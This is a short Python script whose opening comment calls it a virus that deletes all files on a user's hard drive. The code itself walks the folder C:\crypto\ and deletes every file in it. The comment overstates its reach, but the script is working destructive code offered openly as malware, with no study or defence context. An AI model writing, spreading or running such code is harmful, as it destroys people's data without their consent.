
#This script is a virus that will delete all files on a user's hard drive. 
import os 
directory = 'C:\\crypto\\' 
for root,dirs,files in os.walk(directory): 
    for f in files: 
        try: 
            os.unlink(os.path.join(root, f)) 
        except Exception as e: 
            print(e)